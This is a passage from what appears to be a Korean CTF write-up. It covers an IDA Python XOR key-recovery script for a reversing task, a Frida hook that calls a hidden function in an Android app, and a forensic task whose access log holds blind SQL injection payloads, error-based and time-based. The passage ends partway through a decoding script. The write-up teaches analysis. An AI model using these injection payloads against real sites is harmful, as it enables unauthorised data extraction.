    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">size_xor</span><span class="p">):</span>
        <span class="n">cur</span> <span class="o">=</span> <span class="n">addr_xor</span> <span class="o">+</span> <span class="n">i</span>
        <span class="n">result</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">idc</span><span class="p">.</span><span class="n">Byte</span><span class="p">(</span><span class="n">cur</span><span class="p">)</span> <span class="o">^</span> <span class="n">xor_key</span><span class="p">[</span><span class="n">i</span> <span class="o">%</span> <span class="nb">len</span><span class="p">(</span><span class="n">xor_key</span><span class="p">)])</span>
    <span class="k">return</span> <span class="n">result</span>

<span class="n">addr_start</span> <span class="o">=</span> <span class="mh">0x401000</span>   <span class="c1"># 함수 시작 주소
</span><span class="n">addr_end</span> <span class="o">=</span> <span class="mh">0x42D700</span>     <span class="c1"># 함수 마지막 주소, 길이 계산에 사용
</span>
<span class="n">cnt</span> <span class="o">=</span> <span class="mi">0</span>
<span class="n">keys</span> <span class="o">=</span> <span class="p">[]</span>

<span class="n">cur</span> <span class="o">=</span> <span class="n">addr_start</span>
<span class="k">while</span> <span class="n">cur</span> <span class="o">&lt;</span> <span class="n">addr_end</span><span class="p">:</span>   <span class="c1"># 디스어셈블리를 통해 Key 크기, 패치 주소를 구함
</span>    <span class="n">key_size</span> <span class="o">=</span> <span class="mi">0</span>
    <span class="n">addr_patch</span> <span class="o">=</span> <span class="mi">0</span>
    <span class="k">while</span> <span class="n">cur</span> <span class="o">&lt;</span> <span class="n">addr_end</span><span class="p">:</span>
        <span class="k">try</span><span class="p">:</span>
            <span class="n">dis</span> <span class="o">=</span> <span class="n">idc</span><span class="p">.</span><span class="n">GetDisasm</span><span class="p">(</span><span class="n">cur</span><span class="p">)</span>
            <span class="k">if</span> <span class="n">dis</span><span class="p">.</span><span class="n">find</span><span class="p">(</span><span class="s">"retn"</span><span class="p">)</span> <span class="o">!=</span> <span class="o">-</span><span class="mi">1</span><span class="p">:</span>
                <span class="k">break</span>
            <span class="c1"># cmp 명령어에서 Key 크기 추출
</span>            <span class="k">if</span> <span class="n">dis</span><span class="p">.</span><span class="n">find</span><span class="p">(</span><span class="s">"cmp"</span><span class="p">)</span> <span class="o">!=</span> <span class="o">-</span><span class="mi">1</span> <span class="ow">and</span> <span class="n">dis</span><span class="p">.</span><span class="n">find</span><span class="p">(</span><span class="s">"], 0"</span><span class="p">)</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">:</span>
                <span class="n">tmp</span> <span class="o">=</span> <span class="n">dis</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="s">", "</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span>
                <span class="k">if</span> <span class="n">tmp</span><span class="p">.</span><span class="n">find</span><span class="p">(</span><span class="s">"h"</span><span class="p">)</span> <span class="o">!=</span> <span class="o">-</span><span class="mi">1</span><span class="p">:</span>
                    <span class="n">key_size</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">tmp</span><span class="p">[:</span><span class="o">-</span><span class="mi">1</span><span class="p">],</span> <span class="n">base</span><span class="o">=</span><span class="mi">16</span><span class="p">)</span>
                <span class="k">else</span><span class="p">:</span>
                    <span class="n">key_size</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">tmp</span><span class="p">)</span>
            <span class="c1"># sub 명령어에서 패치 주소 추출
</span>            <span class="k">if</span> <span class="n">dis</span><span class="p">.</span><span class="n">find</span><span class="p">(</span><span class="s">"sub"</span><span class="p">)</span> <span class="o">!=</span> <span class="o">-</span><span class="mi">1</span> <span class="ow">and</span> <span class="n">dis</span><span class="p">.</span><span class="n">find</span><span class="p">(</span><span class="s">"offset"</span><span class="p">)</span> <span class="o">!=</span> <span class="o">-</span><span class="mi">1</span><span class="p">:</span>
                <span class="n">tmp</span> <span class="o">=</span> <span class="n">dis</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="s">"_"</span><span class="p">)[</span><span class="mi">1</span><span class="p">].</span><span class="n">replace</span><span class="p">(</span><span class="s">" "</span><span class="p">,</span> <span class="s">""</span><span class="p">)</span>
                <span class="k">if</span> <span class="n">tmp</span><span class="p">.</span><span class="n">find</span><span class="p">(</span><span class="s">";"</span><span class="p">)</span> <span class="o">!=</span> <span class="o">-</span><span class="mi">1</span><span class="p">:</span>
                    <span class="n">tmp</span> <span class="o">=</span> <span class="n">tmp</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="s">";"</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
                <span class="n">addr_patch</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">tmp</span><span class="p">,</span> <span class="n">base</span><span class="o">=</span><span class="mi">16</span><span class="p">)</span>
            <span class="n">cur</span> <span class="o">+=</span> <span class="n">idc</span><span class="p">.</span><span class="n">ItemSize</span><span class="p">(</span><span class="n">cur</span><span class="p">)</span>
        <span class="k">except</span><span class="p">:</span>
            <span class="k">break</span>
            
    <span class="k">print</span> <span class="n">cnt</span><span class="p">,</span> <span class="n">key_size</span><span class="p">,</span> <span class="nb">hex</span><span class="p">(</span><span class="n">addr_patch</span><span class="p">),</span>
    
    <span class="c1"># Flag 출력 함수의 경우 임의로 Key을 수정
</span>    <span class="k">if</span> <span class="n">cnt</span> <span class="o">==</span> <span class="mi">10</span><span class="p">:</span>
        <span class="n">key_size</span> <span class="o">=</span> <span class="mi">32</span>
        
        <span class="n">tmp</span> <span class="o">=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x454D4E4A</span><span class="p">)</span>
        <span class="n">tmp</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x07692B4B</span><span class="p">)</span>
        <span class="n">tmp</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x2D0C1A2C</span><span class="p">)</span>
        <span class="n">tmp</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x0E0D100A</span><span class="p">)</span>
        <span class="n">tmp</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x09090476</span><span class="p">)</span>
        <span class="n">tmp</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x26065966</span><span class="p">)</span>
        <span class="n">tmp</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x1C103417</span><span class="p">)</span>
        <span class="n">tmp</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x567C2075</span><span class="p">)</span>
        
        <span class="n">prev_key</span> <span class="o">=</span> <span class="n">xor_key</span><span class="p">[::]</span>
        <span class="n">xor_key</span> <span class="o">=</span> <span class="p">[]</span>
        <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">key_size</span><span class="p">):</span>
            <span class="n">xor_key</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="n">tmp</span><span class="p">[</span><span class="n">i</span><span class="p">])</span> <span class="o">^</span> <span class="n">prev_key</span><span class="p">[</span><span class="n">i</span> <span class="o">%</span> <span class="nb">len</span><span class="p">(</span><span class="n">prev_key</span><span class="p">)])</span>
    
    <span class="c1"># 연산 오류가 있을 시 break
</span>    <span class="k">if</span> <span class="n">key_size</span> <span class="o">==</span> <span class="mi">0</span> <span class="ow">or</span> <span class="n">addr_patch</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
        <span class="k">break</span>
    
    <span class="c1"># Flag 출력 함수가 아닌 경우, Key 추출 수행
</span>    <span class="k">if</span> <span class="n">key_size</span> <span class="o">!=</span> <span class="mi">32</span><span class="p">:</span>
        <span class="n">known_data</span> <span class="o">=</span> <span class="p">[</span><span class="mh">0x66</span><span class="p">,</span> <span class="mh">0x90</span><span class="p">,</span> <span class="mh">0x55</span><span class="p">,</span> <span class="mh">0x8B</span><span class="p">,</span> <span class="mh">0xEC</span><span class="p">]</span> <span class="c1"># 알려진 Hot Patching 5바이트
</span>        <span class="n">xor_key</span> <span class="o">=</span> <span class="p">[]</span>
        <span class="c1"># Hot Patching 5바이트를 통해, Key 첫 5글자 추출
</span>        <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">5</span><span class="p">):</span>
            <span class="n">xor_key</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">idc</span><span class="p">.</span><span class="n">Byte</span><span class="p">(</span><span class="n">addr_patch</span> <span class="o">+</span> <span class="n">i</span><span class="p">)</span> <span class="o">^</span> <span class="n">known_data</span><span class="p">[</span><span class="n">i</span><span class="p">])</span>
        
        <span class="c1"># 5글자 보다 많을 경우
</span>        <span class="k">if</span> <span class="n">key_size</span> <span class="o">!=</span> <span class="mi">5</span><span class="p">:</span>
            <span class="n">xor_key</span> <span class="o">+=</span> <span class="p">[</span><span class="mh">0x00</span><span class="p">]</span> <span class="o">*</span> <span class="p">(</span><span class="n">key_size</span> <span class="o">-</span> <span class="mi">5</span><span class="p">)</span>

            <span class="c1"># 모르는 글자는 0x00으로 채우고 Xor 연산 수행
</span>            <span class="n">data</span> <span class="o">=</span> <span class="n">xor_data</span><span class="p">(</span><span class="n">addr_patch</span><span class="p">,</span> <span class="n">addr_end</span><span class="p">,</span> <span class="n">xor_key</span><span class="p">)</span>
            
            <span class="c1"># 공통 58바이트 코드
</span>            <span class="n">known_data</span> <span class="o">=</span> <span class="p">[</span><span class="mh">0xC7</span><span class="p">,</span> <span class="mh">0x45</span><span class="p">,</span> <span class="mh">0xF8</span><span class="p">,</span> <span class="mh">0x04</span><span class="p">,</span> <span class="mh">0xB3</span><span class="p">,</span> <span class="mh">0x44</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x8B</span><span class="p">,</span> <span class="mh">0x45</span><span class="p">,</span> <span class="mh">0xF8</span><span class="p">,</span> <span class="mh">0x83</span><span class="p">,</span> <span class="mh">0xC0</span><span class="p">,</span> <span class="mh">0x01</span><span class="p">,</span> <span class="mh">0x89</span><span class="p">,</span> <span class="mh">0x45</span><span class="p">,</span> <span class="mh">0xF4</span><span class="p">,</span> <span class="mh">0x8B</span><span class="p">,</span> <span class="mh">0x4D</span><span class="p">,</span> <span class="mh">0xF8</span><span class="p">,</span> <span class="mh">0x8A</span><span class="p">,</span> <span class="mh">0x11</span><span class="p">,</span> <span class="mh">0x88</span><span class="p">,</span> <span class="mh">0x55</span><span class="p">,</span> <span class="mh">0xFF</span><span class="p">,</span> <span class="mh">0x83</span><span class="p">,</span> <span class="mh">0x45</span><span class="p">,</span> <span class="mh">0xF8</span><span class="p">,</span> <span class="mh">0x01</span><span class="p">,</span> <span class="mh">0x80</span><span class="p">,</span> <span class="mh">0x7D</span><span class="p">,</span> <span class="mh">0xFF</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x75</span><span class="p">,</span> <span class="mh">0xEE</span><span class="p">,</span> <span class="mh">0x8B</span><span class="p">,</span> <span class="mh">0x45</span><span class="p">,</span> <span class="mh">0xF8</span><span class="p">,</span> <span class="mh">0x2B</span><span class="p">,</span> <span class="mh">0x45</span><span class="p">,</span> <span class="mh">0xF4</span><span class="p">,</span> <span class="mh">0x89</span><span class="p">,</span> <span class="mh">0x45</span><span class="p">,</span> <span class="mh">0xF0</span><span class="p">,</span> <span class="mh">0x8B</span><span class="p">,</span> <span class="mh">0x4D</span><span class="p">,</span> <span class="mh">0xF0</span><span class="p">,</span> <span class="mh">0x89</span><span class="p">,</span> <span class="mh">0x0D</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0xB3</span><span class="p">,</span> <span class="mh">0x44</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">]</span>
            <span class="n">known_data</span> <span class="o">=</span> <span class="s">""</span><span class="p">.</span><span class="n">join</span><span class="p">(</span><span class="nb">chr</span><span class="p">(</span><span class="n">x</span><span class="p">)</span> <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="n">known_data</span><span class="p">)</span>
            
            <span class="c1"># 공통 58바이트 코드를 통한, Key 전부를 복구
</span>            <span class="n">xor_key</span> <span class="o">=</span> <span class="n">xor_key</span><span class="p">[:</span><span class="mi">5</span><span class="p">]</span>
            <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">data</span><span class="p">)</span> <span class="o">-</span> <span class="n">key_size</span><span class="p">):</span>
                <span class="c1"># 공통 코드와 Xor 수행한 결과를 5바이트씩 비교
</span>                <span class="n">cur_data</span> <span class="o">=</span> <span class="s">""</span><span class="p">.</span><span class="n">join</span><span class="p">(</span><span class="nb">chr</span><span class="p">(</span><span class="n">x</span><span class="p">)</span> <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="n">data</span><span class="p">[</span><span class="n">i</span><span class="p">:</span><span class="n">i</span><span class="o">+</span><span class="mi">5</span><span class="p">])</span>
                <span class="n">idx</span> <span class="o">=</span> <span class="n">known_data</span><span class="p">.</span><span class="n">find</span><span class="p">(</span><span class="n">cur_data</span><span class="p">)</span>
                <span class="k">if</span> <span class="n">idx</span> <span class="o">!=</span> <span class="o">-</span><span class="mi">1</span><span class="p">:</span>   <span class="c1">#
</span>                    <span class="c1"># 공통 코드의 어느 인덱스부터 Key이 시작 되는지 확인
</span>                    <span class="c1"># (Key 크기, 더미 코드 등에 의해 오프셋이 매번 다르기 때문)
</span>                    <span class="n">org</span> <span class="o">=</span> <span class="n">known_data</span><span class="p">[</span><span class="n">idx</span><span class="o">+</span><span class="mi">5</span><span class="p">:</span><span class="n">idx</span><span class="o">+</span><span class="mi">5</span><span class="o">+</span><span class="n">key_size</span><span class="p">]</span>
                    <span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">key_size</span> <span class="o">-</span> <span class="mi">5</span><span class="p">):</span>
                        <span class="n">xor_key</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="n">org</span><span class="p">[</span><span class="n">j</span><span class="p">])</span> <span class="o">^</span> <span class="n">data</span><span class="p">[</span><span class="n">i</span><span class="o">+</span><span class="mi">5</span><span class="o">+</span><span class="n">j</span><span class="p">])</span> <span class="c1">#Key 복구
</span>                    <span class="k">break</span>
            
            <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">xor_key</span><span class="p">)</span> <span class="o">==</span> <span class="mi">5</span><span class="p">:</span>
                <span class="c1"># Flag 출력 함수(11 번째)의 경우 예외로 처리
</span>                <span class="k">if</span> <span class="n">cnt</span> <span class="o">==</span> <span class="mi">9</span><span class="p">:</span>
                    <span class="n">xor_key</span> <span class="o">+=</span> <span class="p">[</span><span class="nb">ord</span><span class="p">(</span><span class="s">'r'</span><span class="p">),</span> <span class="nb">ord</span><span class="p">(</span><span class="s">'i'</span><span class="p">),</span> <span class="nb">ord</span><span class="p">(</span><span class="s">'n'</span><span class="p">)]</span> <span class="c1">#mandarin
</span>                <span class="k">else</span><span class="p">:</span>
                    <span class="k">print</span> <span class="s">"Error!!"</span>
                    <span class="n">xor_key</span> <span class="o">+=</span> <span class="p">[</span><span class="mh">0x00</span><span class="p">]</span> <span class="o">*</span> <span class="p">(</span><span class="n">key_size</span> <span class="o">-</span> <span class="mi">5</span><span class="p">)</span>
        
    <span class="k">print</span> <span class="s">""</span><span class="p">.</span><span class="n">join</span><span class="p">(</span><span class="nb">chr</span><span class="p">(</span><span class="n">x</span><span class="p">)</span> <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="n">xor_key</span><span class="p">)</span>
    <span class="n">keys</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="s">""</span><span class="p">.</span><span class="n">join</span><span class="p">(</span><span class="nb">chr</span><span class="p">(</span><span class="n">x</span><span class="p">)</span> <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="n">xor_key</span><span class="p">))</span>
    
    
    <span class="n">patch_xor</span><span class="p">(</span><span class="n">addr_patch</span><span class="p">,</span> <span class="n">addr_end</span><span class="p">,</span> <span class="n">xor_key</span><span class="p">)</span>    <span class="c1"># 추출한 Key를 통해 패치 수행
</span>    <span class="n">idc</span><span class="p">.</span><span class="n">MakeCode</span><span class="p">(</span><span class="n">addr_patch</span><span class="p">)</span>                    <span class="c1"># 어셈블리 코드로 변환
</span>    <span class="n">idc</span><span class="p">.</span><span class="n">MakeFunction</span><span class="p">(</span><span class="n">addr_patch</span><span class="p">)</span>                <span class="c1"># 함수화 수행
</span>    
    <span class="n">cur</span> <span class="o">=</span> <span class="n">addr_patch</span>
    <span class="n">cnt</span> <span class="o">+=</span> <span class="mi">1</span>

<span class="n">f</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s">"solve_key.txt"</span><span class="p">,</span> <span class="s">"wb"</span><span class="p">)</span>                 <span class="c1"># 추출한 Key를 저장
</span><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">keys</span><span class="p">)):</span>
    <span class="n">f</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="n">keys</span><span class="p">[</span><span class="n">i</span><span class="p">])</span>
    <span class="n">f</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="s">"</span><span class="se">\r\n</span><span class="s">"</span><span class="p">)</span>
<span class="n">f</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
</code></pre></div></div>

<p><img src="/assets/bob/18_flag2.png" alt="/assets/bob/18_flag2.png"></p>

<center>[그림 7] 두 번째 Flag 획득</center>

<ul>
  <li>Flag 또한 자동으로 연산할 수 있지만, 자동화로 추출한 입력 값을 복사 후 대입하여 획득하였다.</li>
</ul>

<p><br></p>

<p><br></p>

<h2 id="easyroid">
<a class="anchor" href="#easyroid" aria-hidden="true"><span class="octicon octicon-link"></span></a>EASYROID</h2>

<hr>

<p><img src="/assets/bob/bob954.png" alt="/assets/bob/bob954.png"></p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Easy Android Reversing Challenge
</code></pre></div></div>
<ul>
  <li>
    <p>JAVA 코드를 먼저 살펴보자.</p>

    <p><img src="/assets/bob/bob955.png" alt="/assets/bob/bob955.png"></p>

    <p><code class="highlighter-rouge">MainActivity</code>가 실행되면 <a href="http://native-lib.so"><code class="highlighter-rouge">libnative-lib.so</code></a>에 정의되어 있는 <code class="highlighter-rouge">stringFromJNI</code> 함수를 호출 한뒤 <code class="highlighter-rouge">setText</code>로 <code class="highlighter-rouge">TextView</code>에 넣어주는 간단한 코드이다.</p>
  </li>
  <li>
    <p><code class="highlighter-rouge">stringFromJNI</code> 함수를 살펴보자.</p>

    <p><img src="/assets/bob/bob956.png" alt="/assets/bob/bob956.png"></p>

    <p><code class="highlighter-rouge">stringFromJNI</code> 함수는 <code class="highlighter-rouge">Hello BOB9?</code> 문자열을 리턴해준다.</p>
  </li>
</ul>

<p>결국 앱을 실행하면 화면에 <code class="highlighter-rouge">Hello BOB9?</code> 문자열이 출력된요. 실행해서 확인하자.</p>

<p><img src="/assets/bob/bob957.png" alt="/assets/bob/bob957.png"></p>

<p>빙고!</p>

<p><a href="http://native-lib.so"><code class="highlighter-rouge">libnative-lib.so</code></a>의 Export Table을 살펴보면 <code class="highlighter-rouge">stringFromJNI</code> 함수 이 외 한 가지 함수가 더 존재한다.</p>

<p><img src="/assets/bob/bob958.png" alt="/assets/bob/bob958.png"></p>

<p>HiddenStage!!!</p>

<p>HiddenStage 함수를 살펴보자.</p>

<p><img src="/assets/bob/bob959.png" alt="/assets/bob/bob959.png"></p>

<p>BLOWFISH 를 사용해서 특정 값을 Decrypt 하고 Flag를 출력해보자.</p>

<p>따라서 <code class="highlighter-rouge">F0</code>를 BLOWFISH의 키로 <code class="highlighter-rouge">BOB9</code>을 사용해서 Decrypt 해주면 Flag가 나오겠지?</p>

<p>하지만 여기서 <code class="highlighter-rouge">Fake</code>가 존재한다. Init의 마지막 인자는 Key Size인데 7이다.</p>

<p>따서 실제 BLOWFISH의 키 값은 <code class="highlighter-rouge">BOB9\x00\x00\x00</code>!</p>

<p>이런 Fake에 당하지 않으려면 실제로 그대로 실행하는 방법이 있다.</p>

<p>새로운 프로젝트를 만들어서 .so를 끼워넣고 컴파일하는 방법도 있겠지만 Frida를 사용해보자.</p>

<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">var</span> <span class="nx">addrStringFromJNI</span> <span class="o">=</span> <span class="nx">Module</span><span class="p">.</span><span class="nx">findExportByName</span><span class="p">(</span><span class="kc">null</span><span class="p">,</span> <span class="dl">'</span><span class="s1">Java_jeong_su_bob9_1easy_1android_MainActivity_stringFromJNI</span><span class="dl">'</span><span class="p">);</span>
<span class="kd">var</span> <span class="nx">addrHiddenStage</span> <span class="o">=</span> <span class="nx">Module</span><span class="p">.</span><span class="nx">findExportByName</span><span class="p">(</span><span class="kc">null</span><span class="p">,</span> <span class="dl">'</span><span class="s1">Java_jeong_su_bob9_1easy_1android_MainActivity_HiddenStage</span><span class="dl">'</span><span class="p">);</span>
<span class="kd">var</span> <span class="nx">HiddenStage</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">NativeFunction</span><span class="p">(</span><span class="nx">addrHiddenStage</span><span class="p">,</span> <span class="dl">'</span><span class="s1">int</span><span class="dl">'</span><span class="p">,</span> <span class="p">[</span><span class="dl">'</span><span class="s1">pointer</span><span class="dl">'</span><span class="p">]);</span>

<span class="nx">Interceptor</span><span class="p">.</span><span class="nx">attach</span><span class="p">(</span><span class="nx">addrStringFromJNI</span><span class="p">,</span> <span class="p">{</span>
	<span class="na">onEnter</span><span class="p">:</span> <span class="kd">function</span><span class="p">(</span><span class="nx">argv</span><span class="p">){</span>
		<span class="k">this</span><span class="p">.</span><span class="nx">arg0</span> <span class="o">=</span> <span class="nx">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
	<span class="p">},</span>
	<span class="na">onLeave</span><span class="p">:</span> <span class="kd">function</span><span class="p">(</span><span class="nx">rets</span><span class="p">){</span>
		<span class="nx">rets</span><span class="p">.</span><span class="nx">replace</span><span class="p">(</span> <span class="nx">HiddenStage</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="nx">arg0</span><span class="p">)</span> <span class="p">);</span>
	<span class="p">}</span>
<span class="p">});</span>
</code></pre></div></div>

<p>이 스크립트는 stringFromJNI 함수가 호출되면 HiddenStage 함수를 호출하여 리턴을 변경해주는 스크립트이다.</p>

<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">am</span> <span class="nx">start</span> <span class="o">-</span><span class="nx">n</span> <span class="nx">jeong</span><span class="p">.</span><span class="nx">su</span><span class="p">.</span><span class="nx">bob9_easy_android</span><span class="o">/</span><span class="p">.</span><span class="nx">MainActivity</span>
</code></pre></div></div>

<p>그리고 MainActivity를 am 명령어를 사용하여 시작해주면 아래와 같이 플래그를 확인할 수 있다.</p>

<p><img src="/assets/bob/bob960.png" alt="/assets/bob/bob960.png"></p>

<p><br></p>

<p><br></p>

<h1 id="️-forensic">
<a class="anchor" href="#%EF%B8%8F-forensic" aria-hidden="true"><span class="octicon octicon-link"></span></a>🖥️ FORENSIC</h1>

<h2 id="sql-eyes">
<a class="anchor" href="#sql-eyes" aria-hidden="true"><span class="octicon octicon-link"></span></a>SQL Eyes</h2>

<hr>

<p><img src="/assets/bob/bob961.png" alt="/assets/bob/bob961.png"></p>

<p>Find the leaked data</p>

<ul>
  <li>해당 문제에서는 웹 서버의 access.log 파일이 제공되었다.</li>
</ul>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>192.168.47.1 - - [21/Aug/2020:12:51:50 -0700] "GET /view.php?idx=1 HTTP/1.1" 200 202 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.135 Safari/537.36"
192.168.47.1 - - [21/Aug/2020:12:51:50 -0700] "GET /view.php?idx=2-1 HTTP/1.1" 200 202 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.135 Safari/537.36"
192.168.47.1 - - [21/Aug/2020:12:51:50 -0700] "GET /view.php?idx=0%7C%7C1-- HTTP/1.1" 200 202 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.135 Safari/537.36"
192.168.47.1 - - [21/Aug/2020:12:51:50 -0700] "GET /view.php?idx=0%7C%7Cif%28substr%28lpad%28bin%28ord%28substr%28flag%2C1%2C1%29%29%29%2C8%2C0%29%2C1%2C1%29%3D1%2C1%2C%28select+1+union+select+2%29%29-- HTTP/1.1" 500 185 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.135 Safari/537.36"
192.168.47.1 - - [21/Aug/2020:12:51:50 -0700] "GET /archives/ HTTP/1.1" 404 437 "-" "DirBuster-0.12 (http://www.owasp.org/index.php/Category:OWASP_DirBuster_Project)"
192.168.47.1 - - [21/Aug/2020:12:51:50 -0700] "GET /view.php?idx=0%7C%7Cif%28substr%28lpad%28bin%28ord%28substr%28flag%2C1%2C1%29%29%29%2C8%2C0%29%2C2%2C1%29%3D1%2C1%2C%28select+1+union+select+2%29%29-- HTTP/1.1" 200 203 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.135 Safari/537.36"
192.168.47.1 - - [21/Aug/2020:12:51:50 -0700] "GET /view.php?idx=0%7C%7Cif%28substr%28lpad%28bin%28ord%28substr%28flag%2C1%2C1%29%29%29%2C8%2C0%29%2C3%2C1%29%3D1%2C1%2C%28select+1+union+select+2%29%29-- HTTP/1.1" 200 202 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.135 Safari/537.36"
</code></pre></div></div>

<ul>
  <li>access.log를 통해 데이터를 유출한 공격은 Blind SQL Injection 공격인 것을 알 수 있는데 유형이 2가지가 있다.</li>
  <li>
<code class="highlighter-rouge">0||if(substr(lpad(bin(ord(substr(flag,1,1))),8,0),1,1)=1,1,(select 1 union select 2))</code>을 통해 거짓일 경우에는 500 에러를 발생시켜 Error based SQL Injection 공격을 한 것을 확인할 수 있다.</li>
  <li>두번째 유형은 <code class="highlighter-rouge">0||if(substr(lpad(bin(ord(substr(flag,12,1))),8,0),1,1)=1,sleep(3)=0,1)=0--</code> 을 통해 참일 경우 3초 sleep하여 Time based SQL Injection 공격을 한 것을 확인할 수 있다.</li>
  <li>위 두가지 공격 기법을 통해 공격자가 유출한 데이터를 파악하면 된다. 아래와 같이 스크립트를 작성하여 문제를 해결할 수 있다.</li>
</ul>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">f</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s">'access.log'</span><span class="p">,</span> <span class="s">'r'</span><span class="p">)</span>
<span class="n">temp</span> <span class="o">=</span> <span class="s">""</span>
<span class="n">flag</span> <span class="o">=</span> <span class="s">""</span>
<span class="n">prevsec</span> <span class="o">=</span> <span class="mi">0</span>
<span class="n">first_bypass</span> <span class="o">=</span> <span class="bp">True</span>

<span class="k">for</span> <span class="n">line</span> <span class="ow">in</span> <span class="n">f</span><span class="p">.</span><span class="n">readlines</span><span class="p">():</span>
    <span class="n">x</span> <span class="o">=</span> <span class="n">line</span><span class="p">.</span><span class="n">split</span><span class="p">()</span>
    
    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">x</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
        <span class="k">continue</span>
        
    <span class="k">if</span> <span class="s">"OWASP_DirBuster_Project"</span> <span class="ow">in</span> <span class="n">x</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">]:</span>
        <span class="k">continue</span>
        
    <span class="k">if</span> <span class="s">'union'</span> <span class="ow">in</span> <span class="n">x</span><span class="p">[</span><span class="mi">6</span><span class="p">]:</span>
        <span class="k">if</span> <span class="n">x</span><span class="p">[</span><span class="mi">8</span><span class="p">]</span> <span class="o">==</span> <span class="s">'200'</span><span class="p">:</span>
            <span class="n">temp</span> <span class="o">+=</span> <span class="s">"1"</span>
        <span class="k">else</span><span class="p">:</span>
            <span class="n">temp</span> <span class="o">+=</span> <span class="s">"0"</span>
        
        <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">temp</span><span class="p">)</span> <span class="o">%</span> <span class="mi">8</span> <span class="o">==</span> <span class="mi">0</span> <span class="ow">and</span> <span class="nb">len</span><span class="p">(</span><span class="n">temp</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">:</span>
            <span class="n">flag</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">temp</span><span class="p">,</span> <span class="mi">2</span><span class="p">))</span>
            <span class="k">print</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span>
            <span class="n">temp</span> <span class="o">=</span> <span class="s">""</span>
    
    <span class="k">if</span> <span class="s">'sleep'</span> <span class="ow">in</span> <span class="n">x</span><span class="p">[</span><span class="mi">6</span><span class="p">]:</span>
